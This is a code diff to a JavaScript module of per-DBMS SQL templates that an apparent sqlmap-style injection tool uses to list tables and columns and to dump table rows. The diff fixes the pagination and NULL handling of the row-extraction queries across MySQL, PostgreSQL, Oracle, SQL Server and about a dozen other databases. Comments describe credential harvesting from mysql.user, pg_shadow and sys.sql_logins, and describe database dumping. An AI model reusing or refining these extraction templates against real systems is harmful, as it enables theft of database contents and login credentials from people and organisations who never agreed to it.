@@ -7,7 +7,7 @@
 // 依赖 DialectSqlBuilder 的 escSql/escBacktick/escDq/escBracket/escCols
 // =====================================================================
 import {
-  escSql, escBacktick, escDq, escBracket, escCols,
+  escSql, escBacktick, escDq, escBracket, escCols, escColsNN, escColsNNJoin,
 } from './DialectSqlBuilder.js';
 import { versionAtLeast } from './dbmsVersion.js';
 
@@ -26,9 +26,15 @@ export const SYS_QUERIES = {
       `SELECT GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema='${escSql(db)}'`,
     columns: (db, table) =>
       `SELECT GROUP_CONCAT(column_name SEPARATOR ',') FROM information_schema.columns WHERE table_schema='${escSql(db)}' AND table_name='${escSql(table)}'`,
+    // [P0-FIX 2026-09-09] 行分隔符必须显式声明：GROUP_CONCAT 默认用 ',' 连行，而解析器按
+    // 0x1E 切行 → 整表被当成「一行」，列值按索引回填后跨行串列（实测 users 真实 5 行 → 落 1 行）。
+    // [真库实测] MySQL 8.0.28 的 SEPARATOR 只接受**字面量**（SEPARATOR CHAR(30) 是 1064 语法
+    // 错误），故用 hex 字面量 0x1E（=0x30-0x12? 不：0x1E 即十进制 30，行分隔符与解析器一致）。
     data: (db, table, cols, limit, offset = 0, where = null) => {
       const w = where ? ` WHERE ${where}` : '';
-      return 'SELECT GROUP_CONCAT(CONCAT_WS(CHAR(31), ' + escCols(cols, 'MySQL') + ')) FROM `' + escBacktick(db) + '`.`' + escBacktick(table) + '`' + w + ' LIMIT ' + limit + ' OFFSET ' + offset;
+      // [P0-FIX 2026-09-09 真库实测] 分页必须下推进子查询：聚合输出恒为 1 行，顶层 LIMIT/OFFSET
+      // 作用在聚合结果上——第 2 页起恒为空、第 1 页实为整表聚合再被 group_concat_max_len 截断。
+      return 'SELECT GROUP_CONCAT(CONCAT_WS(CHAR(31), ' + escColsNN(cols, 'MySQL') + ') SEPARATOR 0x1E) FROM (SELECT ' + escCols(cols, 'MySQL') + ' FROM `' + escBacktick(db) + '`.`' + escBacktick(table) + '`' + w + ' LIMIT ' + limit + ' OFFSET ' + offset + ') __p';
     },
     // 凭据收割（对标 sqlmap --users/--passwords）：mysql.user 表需额外权限，查询失败由
     // enumerateUsers/enumeratePasswords 捕获并返回 null（不阻断主流程）。
@@ -53,7 +59,8 @@ export const SYS_QUERIES = {
       `SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='${escSql(table)}' AND table_schema='public'`,
     data: (db, table, cols, limit, offset = 0, where = null) => {
       const w = where ? ` WHERE ${where}` : '';
-      return 'SELECT string_agg(CONCAT_WS(CHR(31), ' + escCols(cols, 'PostgreSQL') + '), CHR(30)) FROM "' + escDq(table) + '"' + w + ' LIMIT ' + limit + ' OFFSET ' + offset;
+      // [P0-FIX 2026-09-09] 同 MySQL：分页下推进子查询（聚合结果只有 1 行，顶层分页无意义）
+      return 'SELECT string_agg(CONCAT_WS(CHR(31), ' + escColsNN(cols, 'PostgreSQL') + '), CHR(30)) FROM (SELECT ' + escCols(cols, 'PostgreSQL') + ' FROM "' + escDq(table) + '"' + w + ' LIMIT ' + limit + ' OFFSET ' + offset + ') __p';
     },
     // 凭据收割（对标 sqlmap --users/--passwords）：pg_shadow 需超级用户权限，失败返回 null。
     users: "SELECT string_agg(usename,',') FROM pg_user",
@@ -66,7 +73,9 @@ export const SYS_QUERIES = {
     // SQLite 的 group_concat 仅接受单参数，列间用 ||CHAR(31)|| 拼接成单串后再聚合
     data: (db, table, cols, limit, offset = 0, where = null) => {
       const w = where ? ` WHERE ${where}` : '';
-      return 'SELECT group_concat(' + escCols(cols, 'SQLite').replace(/,/g, ' || CHAR(31) || ') + ' , CHAR(30)) FROM "' + escDq(table) + '"' + w + ' LIMIT ' + limit + ' OFFSET ' + offset;
+      // [P0-FIX 2026-09-09] 用 escColsNNJoin 逐列包 NULL 安全表达式再以 CHAR(31) 连接。
+      // 不可沿用旧 `escCols(...).replace(/,/g, ...)` 的字符串替换：IFNULL 内部的逗号会被误替换。
+      return 'SELECT group_concat(' + escColsNNJoin(cols, 'SQLite', ' || CHAR(31) || ') + ' , CHAR(30)) FROM (SELECT ' + escCols(cols, 'SQLite') + ' FROM "' + escDq(table) + '"' + w + ' LIMIT ' + limit + ' OFFSET ' + offset + ') __p';
     },
   },
   'SQL Server': {
@@ -78,7 +87,8 @@ export const SYS_QUERIES = {
       const w = where ? ` WHERE ${where}` : '';
       // [P2-2 顺带修复] CONCAT → CONCAT_WS：CONCAT 不插入分隔符（列值会黏在一起，
       // 列拆分按 0x1F 必然错位）；CONCAT_WS(CHAR(31), ...) 才是列间分隔语义（2017+ 可用）
-      return 'SELECT string_agg(CONCAT_WS(CHAR(31), ' + escCols(cols, 'SQL Server') + '), CHAR(30)) FROM [' + escBracket(table) + ']' + w + ' ORDER BY (SELECT NULL) OFFSET ' + offset + ' ROWS FETCH NEXT ' + limit + ' ROWS ONLY';
+      // [P0-FIX 2026-09-09] OFFSET/FETCH 下推进子查询（顶层分页作用于聚合结果，恒错）
+      return 'SELECT string_agg(CONCAT_WS(CHAR(31), ' + escColsNN(cols, 'SQL Server') + '), CHAR(30)) FROM (SELECT ' + escCols(cols, 'SQL Server') + ' FROM [' + escBracket(table) + ']' + w + ' ORDER BY (SELECT NULL) OFFSET ' + offset + ' ROWS FETCH NEXT ' + limit + ' ROWS ONLY) __p';
     },
     // 凭据收割（对标 sqlmap --users/--passwords）：sys.sql_logins 需高权限，失败返回 null。
     users: "SELECT string_agg(name,',') FROM sys.sql_logins",
@@ -98,13 +108,13 @@ export const SYS_QUERIES = {
     // [sqlmap 对标 --where] 有 where 时 ROWNUM 用 AND 拼接（WHERE 已存在），无 where 时用 WHERE。
     data: (db, table, cols, limit, offset = 0, where = null) => {
       const w = where ? ` WHERE ${where}` : '';
-      const base = `SELECT listagg(CONCAT(CHR(31), ${escCols(cols, 'Oracle')}), CHR(30)) FROM "${escDq(table)}"${w}`;
-      if (offset > 0) {
-        // 带偏移的分页：ROWNUM 两层包装（兼容 Oracle 9i+，无需 12c OFFSET FETCH）
-        return `SELECT * FROM (SELECT t.*, ROWNUM rnum FROM (${base}) t WHERE ROWNUM <= ${offset + limit}) WHERE rnum > ${offset}`;
-      }
-      const rownumClause = where ? ` AND ROWNUM <= ${limit}` : ` WHERE ROWNUM <= ${limit}`;
-      return `${base}${rownumClause}`;
+      // [P0-FIX 2026-09-09] 先对源表行做 ROWNUM 分页，再对取到的行聚合。
+      // 旧实现对聚合结果套 ROWNUM（恒 1 行）：offset>0 恒空、limit>1 无意义。
+      const inner = `SELECT CONCAT(CHR(31), ${escCols(cols, 'Oracle')}) AS r FROM "${escDq(table)}"${w}`;
+      const src = offset > 0
+        ? `SELECT r FROM (SELECT x.*, ROWNUM rnum FROM (${inner}) x WHERE ROWNUM <= ${offset + limit}) WHERE rnum > ${offset}`
+        : `SELECT r FROM (${inner}) WHERE ROWNUM <= ${limit}`;
+      return `SELECT listagg(r, CHR(30)) FROM (${src})`;
     },
   },
 };
@@ -121,7 +131,7 @@ SYS_QUERIES.ClickHouse = {
   columns: (db, table) => `SELECT groupArray(name) FROM system.columns WHERE database='${escSql(db)}' AND table='${escSql(table)}'`,
   data: (db, table, cols, limit, offset = 0, where = null) => {
     const w = where ? ` WHERE ${where}` : '';
-    return `SELECT arrayStringConcat(groupArray(CONCAT(${escCols(cols, 'ClickHouse')})), CHAR(30)) FROM \`${escBacktick(db)}\`.\`${escBacktick(table)}\`${w} LIMIT ${limit} OFFSET ${offset}`;
+    return `SELECT arrayStringConcat(groupArray(CONCAT(${escCols(cols, 'ClickHouse')})), CHAR(30)) FROM (SELECT ${escCols(cols, 'ClickHouse')} FROM \`${escBacktick(db)}\`.\`${escBacktick(table)}\`${w} LIMIT ${limit} OFFSET ${offset}) __p`;
   },
 };
 
@@ -133,7 +143,7 @@ SYS_QUERIES.DB2 = {
     `SELECT listagg(COLNAME, ',') FROM SYSCAT.COLUMNS WHERE TABNAME='${escSql(table)}' AND TABSCHEMA NOT LIKE 'SYS%'`,
   data: (db, table, cols, limit, offset = 0, where = null) => {
     const w = where ? ` WHERE ${where}` : '';
-    return `SELECT listagg(CONCAT(CHAR(31), ${escCols(cols, 'DB2')}), CHAR(30)) FROM "${escDq(table)}"${w} LIMIT ${limit} OFFSET ${offset}`;
+    return `SELECT listagg(CONCAT(CHAR(31), ${escCols(cols, 'DB2')}), CHAR(30)) FROM (SELECT ${escCols(cols, 'DB2')} FROM "${escDq(table)}"${w} LIMIT ${limit} OFFSET ${offset}) __p`;
   },
 };
 
@@ -145,7 +155,7 @@ SYS_QUERIES.HSQLDB = {
     `SELECT GROUP_CONCAT(COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='${escSql(table)}'`,
   data: (db, table, cols, limit, offset = 0, where = null) => {
     const w = where ? ` WHERE ${where}` : '';
-    return `SELECT GROUP_CONCAT(CONCAT_WS(CHAR(31), ${escCols(cols, 'HSQLDB')})) FROM \`${escBacktick(table)}\`${w} LIMIT ${limit} OFFSET ${offset}`;
+    return `SELECT GROUP_CONCAT(CONCAT_WS(CHAR(31), ${escColsNN(cols, 'HSQLDB')}) SEPARATOR CHAR(30)) FROM (SELECT ${escCols(cols, 'HSQLDB')} FROM \`${escBacktick(table)}\`${w} LIMIT ${limit} OFFSET ${offset}) __p`;
   },
 };
 
@@ -157,7 +167,7 @@ SYS_QUERIES.Derby = {
     `SELECT GROUP_CONCAT(COLUMNNAME) FROM SYS.SYSCOLUMNS WHERE REFERENCEID=(SELECT TABLEID FROM SYS.SYSTABLES WHERE TABLENAME='${escSql(table)}')`,
   data: (db, table, cols, limit, offset = 0, where = null) => {
     const w = where ? ` WHERE ${where}` : '';
-    return `SELECT GROUP_CONCAT(CONCAT_WS(CHAR(31), ${escCols(cols, 'Derby')}), CHAR(30)) FROM "${escDq(table)}"${w} OFFSET ${offset} ROWS FETCH NEXT ${limit} ROWS ONLY`;
+    return `SELECT GROUP_CONCAT(CONCAT_WS(CHAR(31), ${escColsNN(cols, 'Derby')}), CHAR(30)) FROM (SELECT ${escCols(cols, 'Derby')} FROM "${escDq(table)}"${w} OFFSET ${offset} ROWS FETCH NEXT ${limit} ROWS ONLY) __p`;
   },
 };
 
@@ -176,10 +186,12 @@ SYS_QUERIES.Sybase = {
   // 旧模板拼成 `... FROM [table] WHERE ... TOP n START AT m`，在 ASE 上是语法错误（拖库必然失败）。
   data: (db, table, cols, limit, offset = 0, where = null) => {
     const w = where ? ` WHERE ${where}` : '';
-    const agg = `list(CONCAT_WS(CHAR(31), ${escCols(cols, 'Sybase')}), CHAR(30))`;
-    return offset > 0
-      ? `SELECT TOP ${limit} START AT ${offset + 1} ${agg} FROM [${escBracket(table)}]${w}`
-      : `SELECT TOP ${limit} ${agg} FROM [${escBracket(table)}]${w}`;
+    // [P0-FIX 2026-09-09] TOP/START AT 下推进子查询：顶层 TOP 作用在聚合结果（恒 1 行）上无意义
+    const inner = `SELECT ${escCols(cols, 'Sybase')} FROM [${escBracket(table)}]${w}`;
+    const src = offset > 0
+      ? `(SELECT TOP ${limit} START AT ${offset + 1} * FROM (${inner}) __d)`
+      : `(SELECT TOP ${limit} * FROM (${inner}) __d)`;
+    return `SELECT list(CONCAT_WS(CHAR(31), ${escColsNN(cols, 'Sybase')}), CHAR(30)) FROM ${src} __p`;
   },
 };
 
@@ -194,7 +206,7 @@ SYS_QUERIES.Firebird = {
     `SELECT list(rdb$field_name) FROM rdb$relation_fields WHERE rdb$relation_name='${escSql(table)}'`,
   data: (db, table, cols, limit, offset = 0, where = null) => {
     const w = where ? ` WHERE ${where}` : '';
-    return `SELECT list(ASCII_CHAR(31) || ${escCols(cols, 'Firebird').replace(/,/g, ' || ASCII_CHAR(31) || ')}, ASCII_CHAR(30)) FROM "${escDq(table)}"${w} ROWS (${offset + 1}) TO (${offset + limit})`;
+    return `SELECT list(ASCII_CHAR(31) || ${escCols(cols, 'Firebird').replace(/,/g, ' || ASCII_CHAR(31) || ')}, ASCII_CHAR(30)) FROM (SELECT ${escCols(cols, 'Firebird').replace(/,/g, ' || ASCII_CHAR(31) || ')} FROM "${escDq(table)}"${w} ROWS (${offset + 1}) TO (${offset + limit})) __p`;
   },
 };
 
@@ -219,7 +231,7 @@ SYS_QUERIES.H2 = {
     `SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='${escSql(table)}'`,
   data: (db, table, cols, limit, offset = 0, where = null) => {
     const w = where ? ` WHERE ${where}` : '';
-    return `SELECT GROUP_CONCAT(CONCAT_WS(CHAR(31), ${escCols(cols, 'H2')})) FROM "${escDq(table)}"${w} LIMIT ${limit} OFFSET ${offset}`;
+    return `SELECT GROUP_CONCAT(CONCAT_WS(CHAR(31), ${escColsNN(cols, 'H2')}) SEPARATOR CHAR(30)) FROM (SELECT ${escCols(cols, 'H2')} FROM "${escDq(table)}"${w} LIMIT ${limit} OFFSET ${offset}) __p`;
   },
 };
 
@@ -241,7 +253,7 @@ SYS_QUERIES.MonetDB = {
     `SELECT group_concat(name) FROM sys.columns WHERE table_id=(SELECT id FROM sys.tables WHERE name='${escSql(table)}')`,
   data: (db, table, cols, limit, offset = 0, where = null) => {
     const w = where ? ` WHERE ${where}` : '';
-    return `SELECT group_concat(CONCAT_WS(CHAR(31), ${escCols(cols, 'MonetDB')})) FROM "${escDq(table)}"${w} LIMIT ${limit} OFFSET ${offset}`;
+    return `SELECT group_concat(CONCAT_WS(CHAR(31), ${escColsNN(cols, 'MonetDB')}), CHAR(30)) FROM (SELECT ${escCols(cols, 'MonetDB')} FROM "${escDq(table)}"${w} LIMIT ${limit} OFFSET ${offset}) __p`;
   },
 };
 
